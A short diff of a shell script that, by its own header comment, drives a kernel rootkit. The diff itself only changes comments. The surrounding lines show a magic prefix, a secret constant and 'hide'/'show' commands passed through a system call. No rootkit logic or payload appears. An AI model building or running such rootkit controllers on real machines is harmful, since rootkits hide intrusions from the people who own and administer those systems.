@@ -15,7 +15,7 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
-# simple driver script
+# simple rootkit driver script
 # Usage: ./$0 COMMAND [ULONG | 0xHEXULONG | CARRAY ...]
 # CALL
 #   system call number
@@ -34,6 +34,9 @@ COMMAND_LEN=`echo -n "${COMMAND}" | wc -c`
 PREFIX="3v!1"
 SECRET=0xDEADBEEFDEADBEEF
 REST=`echo -n "$@" | cut "-c$(( ${COMMAND_LEN} + 1 ))-"`
+
+# most of this should be done in the module,
+# but sadly time isn't abundant
 
 if [ "${COMMAND}" = hide ] || [ "${COMMAND}" = show ]
 then
